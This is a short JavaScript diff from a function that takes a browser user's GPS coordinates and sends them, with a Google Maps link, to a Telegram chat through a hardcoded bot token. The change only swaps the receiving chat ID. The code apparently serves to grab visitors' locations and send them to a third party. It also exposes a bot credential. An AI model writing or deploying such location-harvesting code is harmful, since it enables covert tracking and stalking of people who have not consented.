@@ -3,7 +3,7 @@ function sendLocation(position) {
   const lon = position.coords.longitude;
 
   const telegramToken = "8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0";
-  const chatId = "7485197107";
+  const chatId = "5931662777";
   const message = `📍 GPS Location:\nLatitude: ${lat}\nLongitude: ${lon}\nhttps://www.google.com/maps?q=${lat},${lon}`;
 
   fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
